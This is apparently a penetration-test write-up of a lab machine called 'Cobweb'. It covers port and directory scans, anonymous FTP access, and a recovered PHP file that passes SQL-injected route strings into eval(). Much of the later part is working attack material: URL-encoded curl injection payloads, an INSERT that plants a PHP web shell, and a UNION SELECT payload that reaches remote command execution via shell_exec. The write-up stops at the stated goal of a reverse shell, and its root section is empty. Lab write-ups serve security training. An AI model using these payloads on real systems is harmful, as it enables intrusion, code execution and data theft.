# Report - Cobweb

- Author: Henry Post
- Target: Cobweb
- Target IP: 192.168.55.162
- Date: 04/25/2026

## Executive Summary

### Recommendations

## Recon

We run `nmap -sS -sV cobweb`.

| port | service      | notes |
| ---- | ------------ | ----- |
| 21   | vsftpd 3.0.3 |       |
| 22   | openssh      |       |
| 80   | httpd        |       |
| 3306 | mysql        |       |
| 9090 | zeus-admin   |       |
Let's run `gobuster`.

```sh
gobuster dir -u http://cobweb:80/ -w /usr/share/wordlists/dirb/common.txt # --exclude-length 43264 -x php,txt,html

===============================================================
Gobuster v3.8.2
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://cobweb:80/
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                /usr/share/wordlists/dirb/common.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.8.2
[+] Timeout:                 10s
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
.hta                 (Status: 403) [Size: 199]
.htaccess            (Status: 403) [Size: 199]
.htpasswd            (Status: 403) [Size: 199]
cgi-bin/             (Status: 403) [Size: 199]
etc                  (Status: 403) [Size: 0]
index.php            (Status: 401) [Size: 5422]
index.html           (Status: 401) [Size: 5422]
login                (Status: 403) [Size: 103]
Login                (Status: 403) [Size: 103]
phpinfo              (Status: 200) [Size: 76465]
wp-admin             (Status: 403) [Size: 0]
Progress: 4613 / 4613 (100.00%)
===============================================================
Finished
===============================================================

```

Nothing too interesting from `gobuster`...

http://cobweb/ hosts a login page. Let's use `cewl` to generate a wordlist, then use `hydra`.

```bash

cewl http://cobweb/ > words.txt
(empty)
```

Hmm. I am tempted to use a guide.

Let's check http://cobweb/phpinfo . Maybe an env var or username can give us a clue for login.

Nothing interesting. Let's try knocking on SSH and FTP.

`ftp anonymous@cobweb` worked! We've got FTP access.

```sh
ftp anonymous@cobweb

150 Here comes the directory listing.
-rw-r--r--    1 501      20            955 Aug 27  2021 access.log
-rw-r--r--    1 501      20            530 Aug 27  2021 auth.log
-rw-r--r--    1 501      20            176 Aug 27  2021 syslog
```

```
access.log:

192.168.118.5 - - [27/Aug/2021:08:45:45 -0400] "GET / HTTP/1.1" 401 5422 "-" "Mozilla/5.0 (X11; Linux x86_64; rv:78.0) Gecko/20100101 Firefox/78.0"
192.168.118.5 - - [27/Aug/2021:08:45:55 -0400] "POST / HTTP/1.1" 401 5422 "http://192.168.120.61/" "Mozilla/5.0 (X11; Linux x86_64; rv:78.0) Gecko/20100101 Firefox/78.0"
192.168.118.5 - - [27/Aug/2021:08:46:01 -0400] "GET /index.php HTTP/1.1" 401 5422 "-" "Mozilla/5.0 (X11; Linux x86_64; rv:78.0) Gecko/20100101 Firefox/78.0"
192.168.118.5 - - [27/Aug/2021:08:46:46 -0400] "GET / HTTP/1.1" 401 5422 "-" "Mozilla/5.0 (X11; Linux x86_64; rv:78.0) Gecko/20100101 Firefox/78.0"
192.168.118.5 - - [27/Aug/2021:08:47:04 -0400] "GET /.index.php.swp HTTP/1.1" 200 5422 "-" "Mozilla/5.0 (X11; Linux x86_64; rv:78.0) Gecko/20100101 Firefox/78.0"
192.168.118.5 - - [27/Aug/2021:08:47:23 -0400] "POST / HTTP/1.1" 401 5422 "http://192.168.120.61/" "Mozilla/5.0 (X11; Linux x86_64; rv:78.0) Gecko/20100101 Firefox/78.0"

```
## Non-root access

Hmm, `/.index.php.swp`...

http://cobweb/.index.php.swp

```
.index.php.swp:

"; if(mysqli_multi_query($conn, $sql)){ $results = mysqli_use_result($conn); $first_row = mysqli_fetch_row($results); echo mysqli_error($conn); return($first_row[0]); }else{ http_response_code(404); echo mysqli_error($conn); return(""); } } define("included", true); include "config.php"; $conn = mysqli_connect($db_server, $db_username, $db_password, $db_database); if ($conn->connect_error) { die("Connection failed: " . $conn->connect_error); } if(isset($_SERVER['REDIRECT_URL'])){ $route_string = $_SERVER['REDIRECT_URL']; eval(get_page($conn, $route_string)); }else{ eval(get_page($conn, "/")); } mysqli_close($conn); ?> 
```

Not super useful.

```
auth.log:

May  3 18:20:45 localhost sshd[585]: Server listening on 0.0.0.0 port 22.
May  3 18:20:45 localhost sshd[585]: Server listening on :: port 22.
May  3 18:23:56 localhost login[673]: pam_unix(login:session): session opened fo
r user root by LOGIN(uid=0)
May  3 18:23:56 localhost login[714]: ROOT LOGIN  on '/dev/tty1'
Sep  5 13:49:07 localhost sshd[358]: Received signal 15; terminating.
Sep  5 13:49:07 localhost sshd[565]: Server listening on 0.0.0.0 port 22.
Sep  5 13:49:07 localhost sshd[565]: Server listening on :: port 22.
```

No way it's just `root:root`, haha. That'd be nice, wouldn't it?

```
syslog:

<165>1 2003-10-11T22:14:15.003Z mymachine.example.com evntslog - ID47 [exampleSDID@32473 iut="3" eventSource="Application" eventID="1011"] BOMAn application event log entry...

```

Okay! Z.ai had an excellent recommendation. I feel silly.

http://cobweb/.config.php.swp

Nope.

Maybe we need to use the Zeus admin panel.

Nope! The secret lies within `index.php`! Code execution!

```
index.php:

$route_string = $_SERVER['REDIRECT_URL']; eval(get_page($conn, $route_string));
```

Prettified:

```php
<?php
define("INCLUDED", true);
require_once 'config.php';

$conn = mysqli_connect(
    $db_server,
    $db_username,
    $db_password,
    $db_database
);

if ($conn->connect_error) {
    die("Connection failed: " . $conn->connect_error);
}

if (isset($_SERVER['REDIRECT_URL'])) {
    $routeString = $_SERVER['REDIRECT_URL'];
} else {
    $routeString = '/';
}

eval(get_page($conn, $routeString));
mysqli_close($conn);

$sql = ''; // define your SQL query here

if (!mysqli_multi_query($conn, $sql)) {
    http_response_code(404);
    echo mysqli_error($conn);
    return '';
} else {
    $results = mysqli_use_result($conn);
    $firstRow = mysqli_fetch_row($results);
    echo mysqli_error($conn);
    return $firstRow[0];
}
```

We need to inject code into `REDIRECT_URL` parameter. We can use this to get a reverse shell.

Let's use `curl` with `sleep 10` to test.

```sh
curl -H "REDIRECT_URL: sleep 10" http://cobweb
```

Nope, this fails too. We probably can't set that var, `REDIRECT_URL`...

Wait. What if we...

https://www.url-encode-decode.com/

```
curl "http://cobweb/' AND SLEEP(10)-- -"
curl "http://cobweb/%27+AND+SLEEP%2810%29--+-"

curl "http://cobweb/sleep 10"
curl "http://cobweb/sleep%2010"
```

Nope.

```
???(kali?kali)-[~]
??$ curl "http://cobweb/.index.php.swp" -v 
* Host cobweb:80 was resolved.
* IPv6: (none)
* IPv4: 192.168.53.162
*   Trying 192.168.53.162:80...
* Established connection to cobweb (192.168.53.162 port 80) from 192.168.49.53 port 54376 
* using HTTP/1.x
> GET /.index.php.swp HTTP/1.1
> Host: cobweb
> User-Agent: curl/8.19.0
> Accept: */*
> 
* Request completely sent off
< HTTP/1.1 200 OK
< Date: Sat, 25 Apr 2026 19:44:06 GMT
< Server: Apache/2.4.37 (centos)
< Last-Modified: Fri, 27 Aug 2021 14:22:11 GMT
< ETag: "395-5ca8b358d4aa9"
< Accept-Ranges: bytes
< Content-Length: 917
< Content-Type: text/html; charset=UTF-8
< 
<?php
http_response_code(200);

function get_page($conn, $route_string){
    $sql = "SELECT page_data FROM webpages WHERE route_string = \"" . $route_string . "\";";
    //echo "<!-- " . $sql . " -->";
    if(mysqli_multi_query($conn, $sql)){
        $results = mysqli_use_result($conn);
        $first_row = mysqli_fetch_row($results);
        echo mysqli_error($conn);
        return($first_row[0]);
    }else{
        http_response_code(404);
        echo mysqli_error($conn);
        return("");
    }

}

define("included", true);
include "config.php";

$conn = mysqli_connect($db_server, $db_username, $db_password, $db_database);

if ($conn->connect_error) {
    die("Connection failed: " . $conn->connect_error);
}

if(isset($_SERVER['REDIRECT_URL'])){
    $route_string = $_SERVER['REDIRECT_URL'];
    eval(get_page($conn, $route_string));
}else{
    eval(get_page($conn, "/"));
}


mysqli_close($conn);

?>
* Connection #0 to host cobweb:80 left intact
                                                                                                          
???(kali?kali)-[~]
??$ 

```

So this IS SQL injection on index.php!

I just didn't get the full file.

```php
$sql = "SELECT page_data FROM webpages WHERE route_string = \"" . $route_string . "\";";
```

```python
def build_sql(route_string):  
 sql = "SELECT page_data FROM webpages WHERE route_string = \"" + route_string + "\";";  
 print(sql);  
 return sql;  
  
  
build_sql('"; select * from test; --')
# SELECT page_data FROM webpages WHERE route_string = ""; select * from test; --";
```

Great. My payload should look like this:

```sql
"; select * from test; --
```

...From z.ai:

```sql
"; INSERT INTO webpages (route_string, page_data) VALUES ('owned', '<?php system($_GET["cmd"]); ?>'); --


http://cobweb/%22%3B+INSERT+INTO+webpages+%28route_string%2C+page_data%29+VALUES+%28%27owned%27%2C+%27%3C%3Fphp+system%28%24_GET%5B%22cmd%22%5D%29%3B+%3F%3E%27%29%3B+--

```

Now we can try http://cobweb/owned?cmd=ls.

Nope, this fails too.


```
curl "http://cobweb/%22%20%3B%20INSERT%20INTO%20webpages%20%28route_string%2C%20page_data%29%20VALUES%20%28%27owned%27%2C%20%27%3C%3Fphp%20system%28%24_GET%5B%22cmd%22%5D%29%3B%20%3F%3E%27%29%3B%20--%20-"

curl http://cobweb/owned?cmd=ls
```

Fails.

Okay, apparently it's vulnerable to UNION.

```sh
# Yes, you need to curl. Vulnerable to union

" AND 1=2 UNION SELECT 'echo shell_exec("id");'-- 

curl "http://cobweb/%22%20AND%201=2%20UNION%20SELECT%20%27echo%20shell_exec(%22id%22);%27--%20" 

"

# " AND 1=2 UNION SELECT 'echo shell_exec("id");'-- 

```

![](Pasted%20image%2020260425162801.png)

Okay! We have RCE that works reliably. Now to get a reverse shell.





## Root access
